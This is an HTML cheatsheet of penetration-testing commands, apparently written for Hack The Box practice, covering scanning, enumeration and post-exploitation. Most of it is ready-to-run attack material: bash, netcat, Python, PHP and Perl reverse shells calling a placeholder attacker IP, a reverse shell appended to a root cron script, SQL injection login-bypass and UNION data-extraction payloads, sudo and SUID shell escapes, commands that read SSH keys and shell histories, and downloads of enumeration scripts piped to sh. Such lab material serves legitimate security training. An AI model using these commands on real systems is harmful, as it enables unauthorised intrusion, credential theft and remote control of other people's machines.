<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>HTB Command Cheatsheet</title>
    <link rel="stylesheet" href="../style.css">
</head>
<body>
    <div id="binary-bg" aria-hidden="true"></div>

    <main class="article-container" data-collapsible="true">
        <h1>HTB Command Cheatsheet</h1>
        <div class="meta">
            <time datetime="2025-11-02">November 02, 2025</time>
        </div>
        <div class="tags">
            <span class="tag">HTB</span><span class="tag">Pentest</span><span class="tag">Writeup</span>
        </div>

        <article>
            <h2>NMAP Commands</h2>
            <div class="section-content">

            <div class="command-section">
                <div class="command-title">Basic Scanning</div>
                <pre><code># Quick scan (no stealth)
nmap &lt;tgt IP&gt;

# Specific ports with version detection
nmap -p 22,80,443 -sC -sV &lt;tgt IP&gt;

# All ports with speed optimization
nmap -p- --min-rate=1000 -sC -sV &lt;tgt IP&gt;

# Aggressive scan with OS detection
nmap -A -T4 -p- &lt;tgt IP&gt;

# UDP scan (top 100 ports, requires sudo)
sudo nmap --top-ports 100 -sU -sC -sV &lt;tgt IP&gt;</code></pre>
                <div class="command-desc">
                    <ul>
                        <li>Basic nmap shows open ports quickly without stealth</li>
                        <li>-p specifies ports, -p- scans all 65535 ports</li>
                        <li>--min-rate=1000 sends 1000 packets/second for faster scanning</li>
                        <li>-sC runs default scripts, -sV detects versions</li>
                        <li>-A enables OS detection, version detection, script scanning, and traceroute</li>
                        <li>UDP scans are slower but reveal SNMP, DNS, and other services</li>
                    </ul>
                </div>
            </div>

            <div class="command-section">
                <div class="command-title">Targeted Enumeration</div>
                <pre><code># Vulnerability scanning
nmap --script vuln -p &lt;ports&gt; &lt;tgt IP&gt;

# HTTP enumeration
nmap --script http-enum -p 80,443 &lt;tgt IP&gt;

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users -p 445 &lt;tgt IP&gt;</code></pre>
                <div class="command-desc">
                    <ul>
                        <li>vuln scripts check for known CVEs</li>
                        <li>http-enum discovers hidden directories and files</li>
                        <li>SMB scripts enumerate shares and users on Windows systems</li>
                    </ul>
                </div>
            </div>
            </div>

            <h2>Device Enumeration</h2>
            <div class="section-content">

            <div class="command-section">
                <div class="command-title">System & User Information</div>
                <pre><code># System details
uname -a
cat /etc/os-release
hostname
sudo -V

# Find Python installation
which python
which python3

# Current user context
whoami
id
sudo -l

# Logged in users
w
who
last

# Environment variables
env
env | grep SHELL
env | grep MAIL</code></pre>
                <div class="command-desc">
                    <ul>
                        <li>uname -a shows kernel version and architecture</li>
                        <li>which [python|python3] locates binary path for python</li>
                        <li>sudo -V displays sudo version (for exploit research)</li>
                        <li>w shows who's logged in and their activity</li>
                        <li>who shows just logged-in users, last shows login history</li>
                        <li>Environment variables may leak paths and configuration</li>
                    </ul>
                </div>
            </div>

            <div class="command-section">
                <div class="command-title">Network Information</div>
                <pre><code># Network interfaces and IPs
ifconfig
ip address
ip a

# Routing information
ip r get &lt;tgt IP&gt;

# Active connections and listening ports
netstat -antup
ss -tulpn</code></pre>
                <div class="command-desc">
                    <ul>
                        <li>ip address is the modern replacement for ifconfig</li>
                        <li>ip r get shows routing path to specific IP</li>
                        <li>netstat shows connections but ss is newer and faster</li>
                        <li>Both reveal internal services and established connections</li>
                    </ul>
                </div>
            </div>

            <div class="command-section">
                <div class="command-title">Process & Service Discovery</div>
                <pre><code># Running processes
ps aux
ps -ef
pstree</code></pre>
                <div class="command-desc">
                    <ul>
                        <li>Lists all running processes with user, CPU, and memory info</li>
                        <li>Look for services running as root or unusual processes</li>
                        <li>pstree shows parent-child relationships</li>
                    </ul>
                </div>
            </div>

            <div class="command-section">
                <div class="command-title">Finding Sensitive Files</div>
                <pre><code># SUID/SGID binaries (privilege escalation vectors)
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# World-writable files and directories
find / -writable -type f 2>/dev/null
find / -perm -002 -type f 2>/dev/null

# Database and config files
find / -name "*.db" 2>/dev/null
find / -name "*.sqlite3" 2>/dev/null
find / -name "*config*" 2>/dev/null
find / -name "*pass*" 2>/dev/null

# SSH keys
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys
find / -name "id_rsa" 2>/dev/null

# Command history
cat ~/.bash_history
cat ~/.zsh_history
history

# System logs (may contain credentials)
ls -lt /var/log/
cat /var/log/syslog
cat /var/log/auth.log

# File listing with inodes
ls -lai
ls -lt</code></pre>
                <div class="command-desc">
                    <ul>
                        <li>SUID binaries run with owner privileges - check against GTFOBins</li>
                        <li>Writable files may allow code injection</li>
                        <li>Database and config files often contain credentials</li>
                        <li>SSH keys enable lateral movement</li>
                        <li>Command history reveals previous user actions</li>
                        <li>/var/log/ contains system logs that may leak passwords</li>
                        <li>ls -lai shows all files with inode numbers</li>
                        <li>ls -lt sorts by modification time</li>
                    </ul>
                </div>
            </div>
            </div>

            <h2>Misconfiguration Hunting</h2>
            <div class="section-content">

            <div class="command-section">
                <div class="command-title">Privilege Vectors</div>
                <pre><code># Sudo permissions
sudo -l

# Scheduled tasks
crontab -l
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*

# File capabilities
getcap -r / 2>/dev/null

# PATH hijacking check
echo $PATH
find / -writable -type d 2>/dev/null | grep -E "^/usr/local|^/usr/bin|^/bin"</code></pre>
                <div class="command-desc">
                    <ul>
                        <li>sudo -l shows what you can run as root (look for NOPASSWD)</li>
                        <li>Cron jobs running as root with writable scripts are exploitable</li>
                        <li>Capabilities like cap_setuid bypass traditional permissions</li>
                        <li>Writable PATH directories enable binary hijacking</li>
                    </ul>
                </div>
            </div>

            <div class="command-section">
                <div class="command-title">Container Detection</div>
                <pre><code># Docker/container detection
cat /proc/self/cgroup
ls -la /.dockerenv
docker ps</code></pre>
                <div class="command-desc">
                    <ul>
                        <li>Container indicators suggest escape techniques may be needed</li>
                        <li>Container escape techniques differ from standard privilege escalation</li>
                    </ul>
                </div>
            </div>
            </div>

            <h2>Shell Upgrading & Customization</h2>
            <div class="section-content">

            <div class="command-section">
                <div class="command-title">Python pseudo-TTY Upgrade</div>
                <pre><code># Spawn PTY shell
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# If Python unavailable
script -qc /bin/bash /dev/null</code></pre>
                <div class="command-desc">
                    <ul>
                        <li>First step after getting basic shell</li>
                        <li>Provides better control but still limited functionality</li>
                        <li>script command used when Python is missing</li>
                    </ul>
                </div>
            </div>

            <div class="command-section">
                <div class="command-title">Full Interactive TTY</div>
                <pre><code># Step 1: Spawn PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background the shell (Ctrl+Z)

# Step 3: Configure terminal
stty raw && fg

# Step 4: Press Enter twice</code></pre>
                <div class="command-desc">
                    <ul>
                        <li>Provides full terminal with tab completion, clear screen (Ctrl+L), and arrow keys</li>
                        <li>Essential for comfortable enumeration and tool usage</li>
                    </ul>
                </div>
            </div>

            <div class="command-section">
                <div class="command-title">Shell Customization</div>
                <pre><code># Customize prompt (shows user, host, directory, time)
PS1="[\u@\h]-[\w] \t [\$]: "</code></pre>
                <div class="command-desc">
                    <ul>
                        <li>Custom PS1 prompt improves readability with username (\u), hostname (\h), working directory (\w), and time (\t)</li>
                    </ul>
                </div>
            </div>
            </div>

            <h2>Reverse Shells</h2>
            <div class="section-content">

            <div class="command-section">
                <div class="command-title">Bash & Netcat</div>
                <pre><code># Bash TCP
bash -i >& /dev/tcp/&lt;Atk IP&gt;/&lt;port&gt; 0>&1

# Netcat (with -e flag)
nc -e /bin/bash &lt;Atk IP&gt; &lt;port&gt;

# Netcat (without -e flag, common in CTFs)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc &lt;Atk IP&gt; &lt;port&gt; >/tmp/f</code></pre>
                <div class="command-desc">
                    <ul>
                        <li>Bash requires /dev/tcp support (most Linux systems)</li>
                        <li>Netcat -e is often removed in security-focused distributions</li>
                        <li>FIFO method works when -e is unavailable</li>
                    </ul>
                </div>
            </div>

            <div class="command-section">
                <div class="command-title">Scripting Language Shells</div>
                <pre><code># Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;Atk IP&gt;",&lt;port&gt;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'

# PHP
php -r '$sock=fsockopen("&lt;Atk IP&gt;",&lt;port&gt;);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="&lt;Atk IP&gt;";$p=&lt;port&gt;;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'</code></pre>
                <div class="command-desc">
                    <ul>
                        <li>Python is most reliable across systems (replace "python" with "python3" as needed)</li>
                        <li>PHP for web RCE exploitation</li>
                        <li>Perl for older Unix systems</li>
                    </ul>
                </div>
            </div>

            <div class="command-section">
                <div class="command-title">Listener Setup</div>
                <pre><code># Basic netcat listener
nc -lvnp &lt;port&gt;</code></pre>
                <div class="command-desc">
                    <ul>
                        <li>-l (listen mode), -v (verbose), -n (no DNS resolution), -p (specify port)</li>
                    </ul>
                </div>
            </div>
            </div>

            <h2>Web Application Testing</h2>
            <div class="section-content">

            <div class="command-section">
                <div class="command-title">Server-Side Template Injection (SSTI) Detection</div>
                <pre><code># Test for template injection vulnerabilities
${{<%[%'"}}%\</code></pre>
                <div class="command-desc">
                    <ul>
                        <li>If an exception is raised, the injected template syntax is potentially being interpreted by the server</li>
                        <li>This is one sign that a vulnerability to server-side template injection may exist</li>
                        <li>Test in form inputs, URL parameters, and anywhere user input is rendered</li>
                    </ul>
                </div>
            </div>
            </div>

            <h2>SQL Injection</h2>
            <div class="section-content">

            <div class="command-section">
                <div class="command-title">Authentication Bypass Payloads</div>
                <pre><code># Username field payloads
admin' OR '1'='1
admin' OR 1=1 --
admin' OR 1=1 #
admin'#
admin'--

# Combined username/password
Username: admin'#
Password: (anything)

# Email field
email=admin ' or 1 = 1 -- -&password=password

# Alternative OR statements
' or 1=1--
' or 1=1 #
' or 1=1/*
') or '1'='1--
') or ('1'='1--</code></pre>
                <div class="command-desc">
                    <ul>
                        <li>admin'# comments out password check, making authentication succeed with any password</li>
                        <li>Try in username, email, and/or password fields</li>
                        <li>-- and # are SQL comments (space after -- required in some DBs)</li>
                        <li>Parentheses account for different query structures</li>
                        <li>Works when input isn't properly sanitized</li>
                    </ul>
                </div>
            </div>

            <div class="command-section">
                <div class="command-title">UNION-Based Data Extraction</div>
                <pre><code># Determine column count
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--

# Enumerate database structure
' UNION SELECT schema_name FROM information_schema.schemata--
' UNION SELECT table_name FROM information_schema.tables--
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

# Extract data
' UNION SELECT username,password FROM users--
' UNION SELECT group_concat(username),group_concat(password) FROM users--</code></pre>
                <div class="command-desc">
                    <ul>
                        <li>Add NULLs until error disappears to find column count</li>
                        <li>information_schema reveals database structure (MySQL/MariaDB)</li>
                        <li>group_concat combines multiple rows into single output</li>
                    </ul>
                </div>
            </div>

            <div class="command-section">
                <div class="command-title">SQLMap Automation</div>
                <pre><code># URL-based injection
sqlmap -u "http://&lt;tgt IP&gt;/page.php?id=1" --batch --dump

# POST request from file
sqlmap -r request.txt --batch --dump

# Login form
sqlmap -u "http://&lt;tgt IP&gt;/login" --data="username=admin&password=test" --batch</code></pre>
                <div class="command-desc">
                    <ul>
                        <li>--batch auto-answers prompts with defaults</li>
                        <li>--dump extracts database contents</li>
                        <li>Save Burp requests to file for -r flag</li>
                        <li>Much faster than manual injection</li>
                    </ul>
                </div>
            </div>
            </div>

            <h2>Privilege Escalation TTPs</h2>
            <div class="section-content">

            <div class="command-section">
                <div class="command-title">Sudo Exploitation (GTFOBins)</div>
                <pre><code># Check sudo permissions first
sudo -l

# vim/vi
sudo vim -c ':!/bin/sh'

# find
sudo find . -exec /bin/sh \; -quit

# less/more
sudo less /etc/hosts
!/bin/sh

# nmap (older versions)
echo "os.execute('/bin/sh')" > /tmp/shell.nse
sudo nmap --script=/tmp/shell.nse</code></pre>
                <div class="command-desc">
                    <ul>
                        <li>If sudo -l shows NOPASSWD for any binary, check GTFOBins (gtfobins.github.io)</li>
                        <li>Many common utilities have shell escape sequences</li>
                        <li>Always try sudo -l first after gaining shell access</li>
                    </ul>
                </div>
            </div>

            <div class="command-section">
                <div class="command-title">SUID Binary Exploitation</div>
                <pre><code># Find SUID binaries
find / -perm -4000 2>/dev/null

# Analyze suspicious binaries
strings /path/to/suid-binary
ltrace /path/to/suid-binary
strace /path/to/suid-binary

# PATH hijacking example
echo '/bin/sh' > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
/path/to/vulnerable-suid-binary</code></pre>
                <div class="command-desc">
                    <ul>
                        <li>Look for unusual SUID binaries (not standard system binaries)</li>
                        <li>strings reveals hardcoded commands</li>
                        <li>ltrace/strace show system calls</li>
                        <li>If binary calls commands without full path, hijack PATH</li>
                    </ul>
                </div>
            </div>

            <div class="command-section">
                <div class="command-title">Capabilities Exploitation</div>
                <pre><code># Find capabilities
getcap -r / 2>/dev/null

# Example: cap_setuid on Python
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'</code></pre>
                <div class="command-desc">
                    <ul>
                        <li>Capabilities like cap_setuid provide privilege escalation without SUID bit</li>
                        <li>Check GTFOBins for capability-specific exploitation techniques</li>
                    </ul>
                </div>
            </div>

            <div class="command-section">
                <div class="command-title">Cron Job Exploitation</div>
                <pre><code># Find writable cron scripts
ls -la /etc/cron.d/
ls -la /var/spool/cron/crontabs/

# Inject into writable cron script
echo 'bash -i >& /dev/tcp/&lt;Atk IP&gt;/&lt;port&gt; 0>&1' >> /path/to/cron-script.sh</code></pre>
                <div class="command-desc">
                    <ul>
                        <li>Find cron jobs running as root with writable scripts</li>
                        <li>Inject reverse shell for root access</li>
                        <li>Use pspy to monitor for cron execution timing</li>
                    </ul>
                </div>
            </div>
            </div>

            <h2>Essential CTF Tools</h2>
            <div class="section-content">

            <div class="command-section">
                <div class="command-title">Automated Enumeration Scripts</div>
                <pre><code># LinPEAS (comprehensive privilege escalation checker)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# Or transfer:
wget http://&lt;Atk IP&gt;/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# LinEnum (thorough system enumeration)
wget http://&lt;Atk IP&gt;/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh -t

# pspy (monitor processes without root)
wget http://&lt;Atk IP&gt;/pspy64
chmod +x pspy64
./pspy64</code></pre>
                <div class="command-desc">
                    <ul>
                        <li>LinPEAS color-codes findings by severity - red/yellow are priorities</li>
                        <li>LinEnum with -t does thorough testing</li>
                        <li>pspy reveals cron jobs and processes run by other users - critical for timing-based attacks</li>
                    </ul>
                </div>
            </div>

            <div class="command-section">
                <div class="command-title">Password Cracking</div>
                <pre><code># John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --format=raw-md5 hash.txt
john --show hash.txt

# Hashcat (GPU-accelerated)
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt  # MD5
hashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt  # NTLM
hashcat -m 3200 -a 0 bcrypt.txt /usr/share/wordlists/rockyou.txt  # bcrypt</code></pre>
                <div class="command-desc">
                    <ul>
                        <li>John for CPU-based cracking, supports many formats</li>
                        <li>Hashcat uses GPU for 10-100x speed</li>
                        <li>-m specifies hash type (0=MD5, 1000=NTLM, 3200=bcrypt)</li>
                        <li>-a 0 is dictionary attack</li>
                    </ul>
                </div>
            </div>

            <div class="command-section">
                <div class="command-title">Network Service Brute Force</div>
                <pre><code># Hydra
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://&lt;tgt IP&gt;
hydra -L users.txt -P pass.txt ftp://&lt;tgt IP&gt;
hydra -l admin -P /usr/share/wordlists/rockyou.txt &lt;tgt IP&gt; http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"</code></pre>
                <div class="command-desc">
                    <ul>
                        <li>-l single username, -L username list</li>
                        <li>-p single password, -P password list</li>
                        <li>For web forms, capture request in Burp and format as shown</li>
                        <li>F= specifies failure string</li>
                    </ul>
                </div>
            </div>

            <div class="command-section">
                <div class="command-title">Web Directory & Subdomain Discovery</div>
                <pre><code># Gobuster
gobuster dir -u http://&lt;tgt IP&gt; -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://&lt;tgt IP&gt; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt

# ffuf (faster alternative)
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://&lt;tgt IP&gt;/FUZZ
ffuf -w params.txt -u http://&lt;tgt IP&gt;/page?FUZZ=value -fs 4242  # filter by size
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://FUZZ.target.com -fs 4242</code></pre>
                <div class="command-desc">
                    <ul>
                        <li>Gobuster dir for directories, -x adds extensions</li>
                        <li>dns mode for subdomain discovery</li>
                        <li>ffuf is faster and more flexible - FUZZ keyword marks injection point</li>
                        <li>-fs filters responses by size</li>
                    </ul>
                </div>
            </div>

            <div class="command-section">
                <div class="command-title">SMB & Active Directory</div>
                <pre><code># Enum4linux (SMB enumeration)
enum4linux -a &lt;tgt IP&gt;

# SMBClient
smbclient -L //&lt;tgt IP&gt; -N  # list shares (null session)
smbclient //&lt;tgt IP&gt;/share -U username

# CrackMapExec
crackmapexec smb &lt;tgt IP&gt;/24  # network scan
crackmapexec smb &lt;tgt IP&gt; -u user -p pass --shares  # enumerate shares
crackmapexec smb &lt;tgt IP&gt; -u user -p pass -x whoami  # command execution</code></pre>
                <div class="command-desc">
                    <ul>
                        <li>enum4linux combines multiple tools for comprehensive SMB enum</li>
                        <li>-a does all checks</li>
                        <li>smbclient for file access</li>
                        <li>CrackMapExec for lateral movement and multiple target management</li>
                    </ul>
                </div>
            </div>

            <div class="command-section">
                <div class="command-title">File Transfer Methods</div>
                <pre><code># Python HTTP server (on attacker)
python3 -m http.server 80
python -m SimpleHTTPServer 80

# Download on target
wget http://&lt;Atk IP&gt;/file
curl http://&lt;Atk IP&gt;/file -o file

# Netcat transfer
# On attacker (receiving):
nc -lvnp &lt;port&gt; > file
# On target (sending):
nc &lt;Atk IP&gt; &lt;port&gt; < file</code></pre>
                <div class="command-desc">
                    <ul>
                        <li>Python server for quick file hosting</li>
                        <li>wget/curl for downloads</li>
                        <li>Netcat for bidirectional transfer</li>
                    </ul>
                </div>
            </div>

            <div class="command-section">
                <div class="command-title">Additional Useful Tools</div>
                <pre><code># searchsploit (offline exploit database)
searchsploit apache 2.4
searchsploit -m 12345  # mirror exploit by ID
searchsploit -x 12345  # examine exploit

# nikto (web vulnerability scanner)
nikto -h http://&lt;tgt IP&gt;

# WPScan (WordPress scanner)
wpscan --url http://&lt;tgt IP&gt; --enumerate u,p  # enumerate users and plugins

# Metasploit
msfconsole
search exploit_name
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST &lt;Atk IP&gt;
set LPORT &lt;port&gt;
exploit</code></pre>
                <div class="command-desc">
                    <ul>
                        <li>searchsploit searches Exploit-DB locally</li>
                        <li>nikto finds common web vulnerabilities</li>
                        <li>WPScan for WordPress-specific issues</li>
                        <li>Metasploit for exploit frameworks and listeners (meterpreter is powerful post-exploitation shell)</li>
                    </ul>
                </div>
            </div>
            </div>
        </article>
    </main>
</body>
</html>
